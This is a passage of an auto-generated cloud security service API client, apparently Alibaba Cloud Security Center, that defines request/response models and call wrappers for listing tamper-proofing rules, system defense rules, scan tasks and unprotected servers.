  ](name='RuleTargetList', description='An array that consists of the network objects.'),
}

model ListRuleTargetAllResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListRuleTargetAllResponseBody(name='body'),
}

/**
 * @summary Queries the network objects based on which a specified cluster is protected.
 *
 * @param request ListRuleTargetAllRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListRuleTargetAllResponse
 */
async function listRuleTargetAllWithOptions(request: ListRuleTargetAllRequest, runtime: Util.RuntimeOptions): ListRuleTargetAllResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListRuleTargetAll',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the network objects based on which a specified cluster is protected.
 *
 * @param request ListRuleTargetAllRequest
 * @return ListRuleTargetAllResponse
 */
async function listRuleTargetAll(request: ListRuleTargetAllRequest): ListRuleTargetAllResponse {
  var runtime = new Util.RuntimeOptions{};
  return listRuleTargetAllWithOptions(request, runtime);
}

model ListSasContainerWebDefenseRuleRequest {
  criteria?: string(name='Criteria', description='The search conditions for assets. The value of this parameter is in the JSON format and contains the following fields:

*   **name**: the name of the search condition.

*   **value**: the value of the search condition.

*   **logicalExp**: the logical relation for multiple search conditions. Valid values:

    *   **OR**: The search conditions use a logical **OR**.
    *   **AND**: The search conditions use a logical **AND**.', example='[{\\\\"name\\\\":\\\\"ruleName\\\\",\\\\"value\\\\":\\\\"test-1818\\\\",\\\\"logicalExp\\\\":\\\\"AND\\\\"}]'),
  currentPage?: int32(name='CurrentPage', description='The page number. Pages start from page 1. Default value: 1.', example='1'),
  logicalExp?: string(name='LogicalExp', description='The logical relation for multiple search conditions. Valid values:

*   **OR**: The search conditions use a logical **OR**.
*   **AND**: The search conditions use a logical **AND**.', example='OR'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: **20**.', example='50'),
}

model ListSasContainerWebDefenseRuleResponseBody = {
  containerWebDefenseRuleList?: [ 
    {
      aliUid?: long(name='AliUid', description='The user ID.', example='1766185894104675'),
      apptotalCount?: int32(name='ApptotalCount', description='The number of the applications.', example='10'),
      gmtCreate?: long(name='GmtCreate', description='The creation time. Unit: milliseconds.', example='1698978109000'),
      gmtModified?: long(name='GmtModified', description='The timestamp when the alert event was last modified. Unit: milliseconds.', example='1678852686000'),
      id?: long(name='Id', description='The ID of the rule.', example='420336648'),
      pathConfDTOList?: [ 
        {
          backupPath?: string(name='BackupPath', description='The backup paths.', example='/tmp/test'),
          defenseMode?: string(name='DefenseMode', description='The prevention mode. Valid values:

*   **block**
*   **audit**', example='audit'),
          defensePath?: string(name='DefensePath', description='The protected path.', example='/usr/test/'),
          excludeFile?: string(name='ExcludeFile', description='The file that is excluded.', example='php'),
          excludeFilePath?: string(name='ExcludeFilePath', description='The path to the file that is excluded.', example='/usr/tt'),
          excludeFileType?: string(name='ExcludeFileType', description='The type of the file that is excluded.', example='jsp'),
          guardType?: int32(name='GuardType', description='The protection mode. Valid values:

*   **0**: basic mode (whitelist)
*   **1**: complex mode (blacklist)', example='0'),
          includeFile?: string(name='IncludeFile', description='The file that is included.', example='/usr/test'),
          includeFileType?: string(name='IncludeFileType', description='The type of the file that is included.', example='php'),
          processPathList?: [ string ](name='ProcessPathList', description='The processes that are added to the whitelist.'),
        }
      ](name='PathConfDTOList', description='The paths that are protected.'),
      ruleName?: string(name='RuleName', description='The name of the rule.', example='test2'),
      ruleStatus?: int32(name='RuleStatus', description='The status of the rule. Valid values:

*   **1**: enabled
*   **0**: disabled', example='1'),
    }
  ](name='ContainerWebDefenseRuleList', description='The rules for container tamper-proofing.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='4'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='42'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID, which is used to query logs and troubleshoot issues.', example='8C376***AE74FB4'),
}

model ListSasContainerWebDefenseRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListSasContainerWebDefenseRuleResponseBody(name='body'),
}

/**
 * @summary Queries rules for container tamper-proofing.
 *
 * @param request ListSasContainerWebDefenseRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListSasContainerWebDefenseRuleResponse
 */
async function listSasContainerWebDefenseRuleWithOptions(request: ListSasContainerWebDefenseRuleRequest, runtime: Util.RuntimeOptions): ListSasContainerWebDefenseRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.logicalExp)) {
    query['LogicalExp'] = request.logicalExp;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListSasContainerWebDefenseRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries rules for container tamper-proofing.
 *
 * @param request ListSasContainerWebDefenseRuleRequest
 * @return ListSasContainerWebDefenseRuleResponse
 */
async function listSasContainerWebDefenseRule(request: ListSasContainerWebDefenseRuleRequest): ListSasContainerWebDefenseRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return listSasContainerWebDefenseRuleWithOptions(request, runtime);
}

model ListSupportObjectSuffixResponseBody = {
  data?: [ string ](name='Data', description='The returned data.'),
  requestId?: string(name='RequestId', description='The request ID.', example='571B2642-BF51-5BDD-906B-D2340DB9****'),
}

model ListSupportObjectSuffixResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListSupportObjectSuffixResponseBody(name='body'),
}

/**
 * @summary Queries supported file suffixes.
 *
 * @param request ListSupportObjectSuffixRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListSupportObjectSuffixResponse
 */
async function listSupportObjectSuffixWithOptions(runtime: Util.RuntimeOptions): ListSupportObjectSuffixResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'ListSupportObjectSuffix',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries supported file suffixes.
 *
 * @return ListSupportObjectSuffixResponse
 */
async function listSupportObjectSuffix(): ListSupportObjectSuffixResponse {
  var runtime = new Util.RuntimeOptions{};
  return listSupportObjectSuffixWithOptions(runtime);
}

model ListSystemAggregationRulesRequest {
  aggregationIds?: [ int32 ](name='AggregationIds', description='The IDs of the aggregation types.'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.

This parameter is required.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.

This parameter is required.', example='20'),
  ruleName?: string(name='RuleName', description='The name of the rule.', example='Rule\\\\*\\\\*\\\\*\\\\*'),
  ruleTypes?: [ int32 ](name='RuleTypes', description='The types of the rules.'),
  systemType?: int32(name='SystemType', description='The type of the operating system. Valid values:

*   **2**: Windows
*   **1**: Linux
*   **0**: all', example='0'),
}

model ListSystemAggregationRulesResponseBody = {
  aggregationList?: [ 
    {
      id?: int32(name='Id', description='The ID of the aggregation type.', example='1'),
      name?: string(name='Name', description='The name of the aggregation type.', example='Remote control\\\\*\\\\*\\\\*\\\\*'),
      ruleCount?: int32(name='RuleCount', description='The number of rules that are of the aggregation type.', example='0'),
    }
  ](name='AggregationList', description='An array that consists of the details about the aggregation types.'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='30'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6800B790-B10A-5C2F-BEB3-F1D5CE61****'),
}

model ListSystemAggregationRulesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListSystemAggregationRulesResponseBody(name='body'),
}

/**
 * @summary Queries the details about the aggregation types of system defense rules.
 *
 * @param request ListSystemAggregationRulesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListSystemAggregationRulesResponse
 */
async function listSystemAggregationRulesWithOptions(request: ListSystemAggregationRulesRequest, runtime: Util.RuntimeOptions): ListSystemAggregationRulesResponse {
  Util.validateModel(request);
  var query = OpenApiUtil.query(Util.toMap(request));
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListSystemAggregationRules',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'GET',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details about the aggregation types of system defense rules.
 *
 * @param request ListSystemAggregationRulesRequest
 * @return ListSystemAggregationRulesResponse
 */
async function listSystemAggregationRules(request: ListSystemAggregationRulesRequest): ListSystemAggregationRulesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listSystemAggregationRulesWithOptions(request, runtime);
}

model ListSystemClientRuleTypesResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='79CFF74D-E967-5407-8A78-EE03B925****'),
  ruleTypes?: [ string ](name='RuleTypes', description='An array that consists of the rule types.'),
}

model ListSystemClientRuleTypesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListSystemClientRuleTypesResponseBody(name='body'),
}

/**
 * @summary Queries the types of system rules.
 *
 * @param request ListSystemClientRuleTypesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListSystemClientRuleTypesResponse
 */
async function listSystemClientRuleTypesWithOptions(runtime: Util.RuntimeOptions): ListSystemClientRuleTypesResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'ListSystemClientRuleTypes',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the types of system rules.
 *
 * @return ListSystemClientRuleTypesResponse
 */
async function listSystemClientRuleTypes(): ListSystemClientRuleTypesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listSystemClientRuleTypesWithOptions(runtime);
}

model ListSystemClientRulesRequest {
  aggregationIds?: [ int32 ](name='AggregationIds', description='The IDs of the aggregation types for rules.'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.

This parameter is required.', example='1'),
  isContainer?: int32(name='IsContainer', description='Specifies whether to query only container images. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.

This parameter is required.', example='20'),
  ruleName?: string(name='RuleName', description='The name of the system defense rule.', example='Rule\\\\*\\\\*\\\\*\\\\*'),
  ruleTypes?: [ int32 ](name='RuleTypes', description='The types of the system defense rules.'),
  systemType?: int32(name='SystemType', description='The type of the OS. Valid values:

*   **2**: Windows
*   **1**: Linux
*   **0**: all types', example='0'),
}

model ListSystemClientRulesResponseBody = {
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='17'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C43CA30F-EF67-51BB-8C95-F31B8303****'),
  ruleList?: [ 
    {
      aggregationName?: string(name='AggregationName', description='The name of the aggregation type for the system defense rule.', example='Initial entry'),
      description?: string(name='Description', description='The description of the system defense rule.', example='Supports alerting or blocking of images that have high-risk vulnerabilities\\\\*\\\\*\\\\*\\\\*'),
      platform?: string(name='Platform', description='The type of the OS. Valid values:

*   **windows**: Windows
*   **linux**: Linux
*   **all**: all types', example='linux'),
      policies?: [ 
        {
          policyKey?: string(name='PolicyKey', description='The policy key.', example='system_auto_****'),
          policyName?: string(name='PolicyName', description='The name of the policy.', example='System self-starting task\\\\*\\\\*\\\\*\\\\*'),
        }
      ](name='Policies', description='An array that consists of policies.'),
      ruleId?: long(name='RuleId', description='The ID of the system defense rule.', example='30****'),
      ruleName?: string(name='RuleName', description='The name of the system defense rule.', example='Rule\\\\*\\\\*\\\\*\\\\*'),
      ruleType?: int32(name='RuleType', description='The type of the system defense rule. Valid values:

*   **1**: alihips, process-specific defense
*   **2**: alinet, network-specific defense', example='alihips'),
      status?: int32(name='Status', description='The status of the system defense rule. Valid values:

*   **online**: enabled
*   **offline**: disabled', example='online'),
      switchEnable?: boolean(name='SwitchEnable', description='Whether the current rule switch takes effect. Valid values:

*   **true**: enabled
*   **false**: disabled', example='true'),
      switchId?: string(name='SwitchId', description='The switch ID of the system defense rule.', example='USER-ENABLE-SWITCH-TYPE_****'),
    }
  ](name='RuleList', description='An array that consists of the system defense rules.'),
}

model ListSystemClientRulesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListSystemClientRulesResponseBody(name='body'),
}

/**
 * @summary Queries system defense rules.
 *
 * @param request ListSystemClientRulesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListSystemClientRulesResponse
 */
async function listSystemClientRulesWithOptions(request: ListSystemClientRulesRequest, runtime: Util.RuntimeOptions): ListSystemClientRulesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aggregationIds)) {
    query['AggregationIds'] = request.aggregationIds;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.isContainer)) {
    query['IsContainer'] = request.isContainer;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.ruleName)) {
    query['RuleName'] = request.ruleName;
  }
  if (!Util.isUnset(request.ruleTypes)) {
    query['RuleTypes'] = request.ruleTypes;
  }
  if (!Util.isUnset(request.systemType)) {
    query['SystemType'] = request.systemType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListSystemClientRules',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries system defense rules.
 *
 * @param request ListSystemClientRulesRequest
 * @return ListSystemClientRulesResponse
 */
async function listSystemClientRules(request: ListSystemClientRulesRequest): ListSystemClientRulesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listSystemClientRulesWithOptions(request, runtime);
}

model ListSystemRuleAggregationTypesRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: zh. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model ListSystemRuleAggregationTypesResponseBody = {
  aggregationTypeList?: [ 
    {
      id?: int32(name='Id', description='The ID of the aggregation type.', example='1'),
      name?: string(name='Name', description='The name of the aggregation type.', example='Remote control\\\\*\\\\*\\\\*\\\\*'),
    }
  ](name='AggregationTypeList', description='An array that consists of the aggregation types.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='1427F3BE-8A7E-57F9-BD4E-590B00D2****'),
}

model ListSystemRuleAggregationTypesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListSystemRuleAggregationTypesResponseBody(name='body'),
}

/**
 * @summary Queries the aggregation types of system defense rules.
 *
 * @param request ListSystemRuleAggregationTypesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListSystemRuleAggregationTypesResponse
 */
async function listSystemRuleAggregationTypesWithOptions(request: ListSystemRuleAggregationTypesRequest, runtime: Util.RuntimeOptions): ListSystemRuleAggregationTypesResponse {
  Util.validateModel(request);
  var query = OpenApiUtil.query(Util.toMap(request));
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListSystemRuleAggregationTypes',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'GET',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the aggregation types of system defense rules.
 *
 * @param request ListSystemRuleAggregationTypesRequest
 * @return ListSystemRuleAggregationTypesResponse
 */
async function listSystemRuleAggregationTypes(request: ListSystemRuleAggregationTypesRequest): ListSystemRuleAggregationTypesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listSystemRuleAggregationTypesWithOptions(request, runtime);
}

model ListTargetByBatchRequest {
  batchId?: long(name='BatchId', description='The ID of the release batch.', example='1371'),
  currentPage?: int32(name='CurrentPage', description='The page number of the current page in a paginated query.

This parameter is required.', example='1'),
  operationBase?: int32(name='OperationBase', description='Asset selection dimension. Values:

- **0**: Machine instance
- **1**: Machine group
- **2**: VPC instance ID', example='0'),
  pageSize?: int32(name='PageSize', description='The maximum number of items to return per page in a paginated query.

This parameter is required.', example='20'),
}

model ListTargetByBatchResponseBody = {
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number of the current page in a paginated query.', example='1'),
    pageSize?: int32(name='PageSize', description='The maximum number of items to return per page in a paginated query.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of items found in the query.', example='30'),
  }(name='PageInfo', description='Pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is a unique identifier generated by Alibaba Cloud for this request and can be used for troubleshooting and problem localization.', example='6EBB8614-746D-555D-AB69-C801AEC7DCE0'),
  targetList?: [ string ](name='TargetList', description='The returned list.'),
}

model ListTargetByBatchResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListTargetByBatchResponseBody(name='body'),
}

/**
 * @summary Query Targets by Batch
 *
 * @param request ListTargetByBatchRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListTargetByBatchResponse
 */
async function listTargetByBatchWithOptions(request: ListTargetByBatchRequest, runtime: Util.RuntimeOptions): ListTargetByBatchResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.batchId)) {
    query['BatchId'] = request.batchId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.operationBase)) {
    query['OperationBase'] = request.operationBase;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListTargetByBatch',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Query Targets by Batch
 *
 * @param request ListTargetByBatchRequest
 * @return ListTargetByBatchResponse
 */
async function listTargetByBatch(request: ListTargetByBatchRequest): ListTargetByBatchResponse {
  var runtime = new Util.RuntimeOptions{};
  return listTargetByBatchWithOptions(request, runtime);
}

model ListUnfinishedOnceTaskRequest {
  target?: string(name='Target', description='The value of the object on which the task runs. If you set TaskType to IMAGE_SCAN, set this parameter to the UUID of the image that you want to scan. If you set TaskType to ASSETS_COLLECTION, set this parameter to the UUID of the server whose information you want to collect.', example='4fe8e1cd-3c37-4851-b9de-124da32c****'),
  taskType?: string(name='TaskType', description='The type of the task. Valid values:

*   **ASSETS_COLLECTION**: asset information collection task
*   **IMAGE_SCAN**: image scan task

This parameter is required.', example='IMAGE_SCAN'),
}

model ListUnfinishedOnceTaskResponseBody = {
  onceTasks?: [ 
    {
      endTime?: long(name='EndTime', description='The time when the task ends.', example='1670307567000'),
      finish?: int32(name='Finish', description='Indicates whether the task is complete. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
      finishCount?: int32(name='FinishCount', description='The number of assets on which the task is complete.', example='67'),
      progress?: long(name='Progress', description='The progress percentage of the task.', example='75'),
      realRunTime?: long(name='RealRunTime', description='The execution duration of the task.', example='1670307567000'),
      resultInfo?: string(name='ResultInfo', description='The execution result of the task.', example='TASK_NOT_SUPPORT_REGION'),
      startTime?: long(name='StartTime', description='The time when the task is started.', example='1640102400000'),
      status?: int32(name='Status', description='The status.', example='1'),
      statusText?: string(name='StatusText', description='The status of the task. Valid values:

*   **INIT**: The task is not started.
*   **START**: The task is started.
*   **SUCCESS**: The task is complete.
*   **TIMEOUT**: The task timed out.', example='SUCCESS'),
      target?: string(name='Target', description='The objective of the task.', example='238cf050a7270dd6940602e70f1e5a11eeaf4e02035f445b7f613ff5e064****'),
      targetType?: string(name='TargetType', description='The type of the assets that are scanned. Valid values:

*   **IMAGE_REPO**: image repository
*   **IMAGE**: image', example='IMAGE'),
      taskId?: string(name='TaskId', description='The ID of the task.', example='9fb50f2af8bb67c9fdb684194c83****'),
      taskImageInfo?: {
        appName?: string(name='AppName', description='The name of the application.', example='ack-jenkins-****'),
        clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='a765ba1435e7f9446065370e9a41****'),
        clusterName?: string(name='ClusterName', description='The name of the cluster.', example='ACK-test-****'),
        digest?: string(name='Digest', description='The image digest.', example='default_digest'),
        image?: string(name='Image', description='The container image.', example='***s.com/sas_test/baseli***'),
        nodeInstanceId?: string(name='NodeInstanceId', description='The instance ID of the node.', example='i-0xi5mxvtmfw9****'),
        nodeIp?: string(name='NodeIp', description='The IP address of the node.', example='172.18.XXX.XXX'),
        nodeName?: string(name='NodeName', description='The name of the node.', example='pztest****'),
        pod?: string(name='Pod', description='The pod of the image.', example='expoit-law-****'),
        regionId?: string(name='RegionId', description='The region ID of the server image.', example='cn-hangzhou'),
        repoId?: string(name='RepoId', description='The ID of the image repository.', example='crr-r88w2vryp8m****'),
        repoName?: string(name='RepoName', description='The name of the image repository.', example='testyyy'),
        repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='bitn***'),
        repoRegionId?: string(name='RepoRegionId', description='The region ID of the image repository.', example='cn-hangzhou'),
        tag?: string(name='Tag', description='The image tag.', example='v1.20-002-a2*****'),
      }(name='TaskImageInfo', description='The information about the image scan task.'),
      taskName?: string(name='TaskName', description='The name of the task.', example='IMAGE_SCAN'),
      taskType?: string(name='TaskType', description='The type of the task.', example='IMAGE_SCAN'),
      totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='30'),
    }
  ](name='OnceTasks', description='The details of the tasks.'),
  requestId?: string(name='RequestId', description='The request ID.', example='F5CF78A7-30AA-59DB-847F-13EE3AE7****'),
}

model ListUnfinishedOnceTaskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListUnfinishedOnceTaskResponseBody(name='body'),
}

/**
 * @summary Queries tasks that are not complete by task type.
 *
 * @param request ListUnfinishedOnceTaskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListUnfinishedOnceTaskResponse
 */
async function listUnfinishedOnceTaskWithOptions(request: ListUnfinishedOnceTaskRequest, runtime: Util.RuntimeOptions): ListUnfinishedOnceTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListUnfinishedOnceTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries tasks that are not complete by task type.
 *
 * @param request ListUnfinishedOnceTaskRequest
 * @return ListUnfinishedOnceTaskResponse
 */
async function listUnfinishedOnceTask(request: ListUnfinishedOnceTaskRequest): ListUnfinishedOnceTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return listUnfinishedOnceTaskWithOptions(request, runtime);
}

model ListUninstallAegisMachinesRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='4'),
  os?: string(name='Os', description='The operating system of the server.

>  The value of this parameter is the value of the Values parameter that is returned by calling the [DescribeCriteria](~~DescribeCriteria~~) operation. If the value of the **Name** parameter in the response is **osType**, the value of the **Values** parameter indicates an operating system.', example='linux'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **5**.', example='5'),
  regionIdStr?: string(name='RegionIdStr', description='The region in which the server resides.

>  The value of this parameter is the value of the Values parameter that is returned by calling the [DescribeCriteria](~~DescribeCriteria~~) operation. If the value of the **Name** parameter in the response is **regionId**, the value of the **Values** parameter indicates a region ID.', example='cn-hangzhou'),
  regionNo?: string(name='RegionNo', description='The region in which the server resides.

>  The value of this parameter is the value of the Values parameter that is returned by calling the [DescribeCriteria](~~DescribeCriteria~~) operation. If the value of the **Name** parameter in the response is **regionId**, the value of the **Values** parameter indicates a region ID.', example='cn-hangzhou'),
  remark?: string(name='Remark', description='The information about the server that you want to query. The value can be the name or the public IP address of the server.', example='172.20.XX.XX'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='180.113.XX.XX'),
  vendor?: int32(name='Vendor', description='The source of the server. Valid values:

*   **0**: an asset provided by Alibaba Cloud.
*   **1**: a third-party cloud server
*   **2**: a server in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a lightweight asset', example='0'),
}

model ListUninstallAegisMachinesResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  machineList?: [ 
    {
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='sas-bdrvxb4b****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='sql-test-001'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='120.79.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='192.168.XX.XX'),
      machineRegion?: string(name='MachineRegion', description='The region in which the server resides.', example='cn-hangzhou'),
      os?: string(name='Os', description='The operating system of the server. Valid values:

*   **linux**
*   **windows**
*   **windows-2003**', example='linux'),
      regionId?: string(name='RegionId', description='The ID of the region in which the server resides.', example='cn-shanghai'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='6d5b361f-958d-48a8-a9d2-d6e82c1****'),
      vendor?: int32(name='Vendor', description='The source of the server. Valid values:

*   **0**: an asset provided by Alibaba Cloud
*   **1**: a third-party cloud server
*   **2**: a server in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a lightweight asset', example='0'),
      vendorName?: string(name='VendorName', description='The name of the service provider (SP) for the server.

Valid values:

*   **ALIYUN**: Alibaba Cloud
*   **OUT**: a third-party service provider
*   **IDC**: a data center
*   **TENCENT**: Tencent Cloud
*   **HUAWEICLOUD**: Huawei Cloud
*   **Microsoft**: Microsoft
*   **AWS**: Amazon Web Services (AWS)
